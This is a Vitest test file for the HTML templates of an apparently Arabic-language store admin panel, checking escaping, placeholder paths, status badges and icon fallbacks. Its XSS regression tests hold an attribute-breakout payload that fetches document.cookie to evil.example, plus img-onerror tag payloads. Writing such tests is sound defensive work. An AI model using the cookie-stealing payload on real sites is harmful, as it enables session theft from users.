import { describe, it, expect } from 'vitest';
import {
  renderProductFormFieldValues,
  renderProductRow,
  renderSectionFormFieldValues,
  renderSectionRow,
  renderCompanyRow,
  renderWholesaleSectionFormFieldValues,
  renderWholesaleSectionRow,
} from '../src/js/admin/admin-templates.js';
import { ICONS, DEFAULT_ICON, iconSource } from '../src/js/admin/icon-picker.js';

// Regression guard for /cso Finding #3: sanitizeInput() only strips <tags>,
// it does not escape quote characters -- so a value with no angle brackets
// at all (e.g. `x" onload="...`) sailed through it untouched and broke out
// of the surrounding HTML attribute (value=, alt=, title=) when rendered.
// These payloads deliberately contain NO '<' or '>' to prove that escaping
// (not sanitizeInput) is what closes the hole.

const attrBreakoutPayload = `x" onload="fetch('//evil.example/c?'+document.cookie)`;
const tagPayload = '<img src=x onerror=alert(1)>';

describe('renderProductFormFieldValues', () => {
  it('escapes a quote-breakout payload in the name value attribute', () => {
    const { name } = renderProductFormFieldValues({ name: attrBreakoutPayload, description: '' });
    expect(name).not.toContain('" onload="');
    expect(name).toContain('&quot; onload=&quot;');
  });

  it('handles no editing product', () => {
    const { name, description } = renderProductFormFieldValues(null);
    expect(name).toBe('');
    expect(description).toBe('');
  });
});

describe('renderProductRow', () => {
  it('escapes a quote-breakout payload in the image alt attribute', () => {
    const html = renderProductRow({ id: '1', name: attrBreakoutPayload, description: '', primary_image_url: '' }, 'قسم');
    expect(html).not.toContain('" onload="');
    expect(html).toContain('&quot; onload=&quot;');
  });

  it('escapes a raw tag payload in the name/description text nodes', () => {
    const html = renderProductRow({ id: '1', name: tagPayload, description: tagPayload, primary_image_url: '' }, 'قسم');
    expect(html).not.toContain(tagPayload);
  });

  it('escapes an attribute-breakout payload in the image src (defense in depth)', () => {
    const html = renderProductRow({ id: '1', name: 'منتج', description: '', primary_image_url: '"><img src=x onerror=alert(3)>' }, 'قسم');
    expect(html).not.toContain('"><img src=x onerror=alert(3)>');
  });

  // Regression guard: this admin page lives at src/pages/admin/products.html,
  // one directory deeper than src/pages/category.html (where the shorter
  // '../../public/...' convention originated) -- reaching repo-root/public/
  // from here needs three '../', not two. A missing level renders a broken
  // <img> for any product with no primary_image_url. Anchored to the src
  // attribute (not a plain .toContain) because the correct three-level path
  // contains the buggy two-level one as a substring.
  it('falls back to the correctly-pathed placeholder image when primary_image_url is missing', () => {
    const html = renderProductRow({ id: '1', name: 'منتج', description: '', primary_image_url: '' }, 'قسم');
    expect(html).toMatch(/src="\.\.\/\.\.\/\.\.\/public\/assets\/placeholder\.svg"/);
    expect(html).not.toMatch(/src="\.\.\/\.\.\/public\//);
  });

  // plan-eng-review finding, resolved: renderProductRow gained
  // wholesaleSectionName/companyName params. A caller that omits them
  // (old 2-arg shape) or a product with no wholesale placement at all
  // must never render the literal string "undefined" -- it falls back to
  // the same placeholder shown when there is truly no wholesale placement.
  it('shows the "no wholesale placement" placeholder when called with the old 2-arg shape', () => {
    const html = renderProductRow({ id: '1', name: 'منتج', description: '', primary_image_url: '', base_price: 100 }, 'قسم');
    expect(html).not.toContain('undefined');
    expect(html).toContain('لا يوجد تصنيف جملة');
  });

  it('shows the wholesale section and company names when both are provided', () => {
    const html = renderProductRow(
      { id: '1', name: 'منتج', description: '', primary_image_url: '', base_price: 100, wholesale_price: 80 },
      'قسم',
      'قسم جملة',
      'شركة الاتحاد'
    );
    expect(html).toContain('قسم جملة');
    expect(html).toContain('شركة الاتحاد');
    expect(html).not.toContain('لا يوجد تصنيف جملة');
  });

  // Code-review follow-up finding (TODOS.md, resolved): a product with
  // ONLY a wholesale_price set (no wholesale section, no company) must
  // still fall back to the placeholder in this badge -- not an empty
  // amber box -- since the badge shows placement, not price.
  it('shows the placeholder (not an empty box) for a wholesale-price-only product', () => {
    const html = renderProductRow(
      { id: '1', name: 'منتج', description: '', primary_image_url: '', base_price: 100, wholesale_price: 80 },
      'قسم',
      undefined,
      undefined
    );
    expect(html).toContain('لا يوجد تصنيف جملة');
  });

  it('escapes wholesale section and company names against tag injection', () => {
    const html = renderProductRow(
      { id: '1', name: 'منتج', description: '', primary_image_url: '' },
      'قسم',
      tagPayload,
      tagPayload
    );
    expect(html).not.toContain(tagPayload);
  });
});

describe('renderCompanyRow', () => {
  it('escapes a quote-breakout payload in the logo alt attribute', () => {
    const html = renderCompanyRow({ id: '1', name: attrBreakoutPayload, description: '', logo_url: '', is_active: true });
    expect(html).not.toContain('" onload="');
    expect(html).toContain('&quot; onload=&quot;');
  });

  it('escapes a raw tag payload in the name/description text nodes', () => {
    const html = renderCompanyRow({ id: '1', name: tagPayload, description: tagPayload, logo_url: '', is_active: true });
    expect(html).not.toContain(tagPayload);
  });

  // Same class of bug as renderProductRow above, fixed alongside it.
  it('falls back to the correctly-pathed placeholder image when logo_url is missing', () => {
    const html = renderCompanyRow({ id: '1', name: 'شركة', description: '', logo_url: '', is_active: true });
    expect(html).toMatch(/src="\.\.\/\.\.\/\.\.\/public\/assets\/placeholder\.svg"/);
    expect(html).not.toMatch(/src="\.\.\/\.\.\/public\//);
  });
});

describe('renderSectionFormFieldValues', () => {
  it('escapes a quote-breakout payload in the name value attribute', () => {
    const { name } = renderSectionFormFieldValues({ name: attrBreakoutPayload, description: '' });
    expect(name).not.toContain('" onload="');
    expect(name).toContain('&quot; onload=&quot;');
  });
});

describe('renderSectionRow', () => {
  it('escapes a quote-breakout payload in the description title attribute', () => {
    const html = renderSectionRow({ id: '1', name: 'قسم', description: attrBreakoutPayload, icon_name: 'laundry.svg' }, 0);
    expect(html).not.toContain('" onload="');
    expect(html).toContain('&quot; onload=&quot;');
  });

  // User Story 3: renderSectionRow gained an isActive param + status badge.
  it('shows an active status badge when isActive is true', () => {
    const html = renderSectionRow({ id: '1', name: 'قسم', icon_name: 'laundry.svg' }, 0, '', true);
    expect(html).toContain('نشط');
    expect(html).not.toContain('موقوف');
  });

  it('shows an inactive status badge when isActive is false', () => {
    const html = renderSectionRow({ id: '1', name: 'قسم', icon_name: 'laundry.svg' }, 0, '', false);
    expect(html).toContain('موقوف');
  });
});

describe('renderWholesaleSectionFormFieldValues', () => {
  it('escapes a quote-breakout payload in the name value attribute', () => {
    const { name } = renderWholesaleSectionFormFieldValues({ name: attrBreakoutPayload });
    expect(name).not.toContain('" onload="');
    expect(name).toContain('&quot; onload=&quot;');
  });

  it('handles no editing section (defaults)', () => {
    const { name, display_order } = renderWholesaleSectionFormFieldValues(null);
    expect(name).toBe('');
    expect(display_order).toBe(0);
  });

  // Feature 005, US3 (T020/T023): icon_name gains the same DEFAULT_ICON
  // fallback style renderSectionFormFieldValues' sibling fields already use,
  // via the shared icon-picker.js module (research.md Decision 5).
  it('defaults icon_name to DEFAULT_ICON when no section is being edited', () => {
    const { icon_name } = renderWholesaleSectionFormFieldValues(null);
    expect(icon_name).toBe(DEFAULT_ICON);
  });

  it('defaults icon_name to DEFAULT_ICON when the section has no icon_name set', () => {
    const { icon_name } = renderWholesaleSectionFormFieldValues({ name: 'قسم جملة' });
    expect(icon_name).toBe(DEFAULT_ICON);
  });

  it('defaults icon_name to DEFAULT_ICON when the section has an unknown icon_name', () => {
    const { icon_name } = renderWholesaleSectionFormFieldValues({ name: 'قسم جملة', icon_name: 'not-a-real-icon.svg' });
    expect(icon_name).toBe(DEFAULT_ICON);
  });

  it('preserves a known icon_name from the section being edited', () => {
    const { icon_name } = renderWholesaleSectionFormFieldValues({ name: 'قسم جملة', icon_name: ICONS[2] });
    expect(icon_name).toBe(ICONS[2]);
  });
});

describe('renderWholesaleSectionRow', () => {
  it('escapes a raw tag payload in the name text node', () => {
    const html = renderWholesaleSectionRow({ id: '1', name: tagPayload, is_active: true }, 0);
    expect(html).not.toContain(tagPayload);
  });

  // Code-review follow-up finding (TODOS.md, resolved): the "#" column
  // must reflect list position (index), not display_order, so
  // non-contiguous display_order values (e.g. 0 and 5) still render as
  // sequential #1/#2 -- matching renderSectionRow's convention.
  it('shows list position (index+1), not display_order+1, in the order column', () => {
    const html = renderWholesaleSectionRow({ id: '1', name: 'قسم جملة', display_order: 5, is_active: true }, 1);
    expect(html).toContain('#2');
    expect(html).not.toContain('#6');
  });

  it('shows an active status badge when is_active is true', () => {
    const html = renderWholesaleSectionRow({ id: '1', name: 'قسم جملة', is_active: true }, 0);
    expect(html).toContain('نشط');
  });

  it('shows an inactive status badge when is_active is false', () => {
    const html = renderWholesaleSectionRow({ id: '1', name: 'قسم جملة', is_active: false }, 0);
    expect(html).toContain('موقوف');
  });

  // Feature 005, US3 (T020/T023): the list row gains an icon thumbnail,
  // sourced via the shared icon-picker.js's iconSource() -- same visual
  // treatment as renderSectionRow's icon column, minus the "مميز" badge
  // (retail-only, per icon-picker.js's `special` design).
  it('renders an icon thumbnail sourced via iconSource() for a known icon_name', () => {
    const html = renderWholesaleSectionRow({ id: '1', name: 'قسم جملة', is_active: true, icon_name: ICONS[3] }, 0);
    expect(html).toContain(`src="${iconSource(ICONS[3])}"`);
  });

  it('falls back to the default icon thumbnail when icon_name is absent', () => {
    const html = renderWholesaleSectionRow({ id: '1', name: 'قسم جملة', is_active: true }, 0);
    expect(html).toContain(`src="${iconSource(null)}"`);
  });

  it('never renders the retail-only "مميز" badge', () => {
    const html = renderWholesaleSectionRow({ id: '1', name: 'قسم جملة', is_active: true, icon_name: 'Gift_Home.svg' }, 0);
    expect(html).not.toContain('مميز');
  });

  it('escapes a tag-injection payload in icon_name (defense in depth)', () => {
    const html = renderWholesaleSectionRow({ id: '1', name: 'قسم جملة', is_active: true, icon_name: tagPayload }, 0);
    expect(html).not.toContain(tagPayload);
  });
});
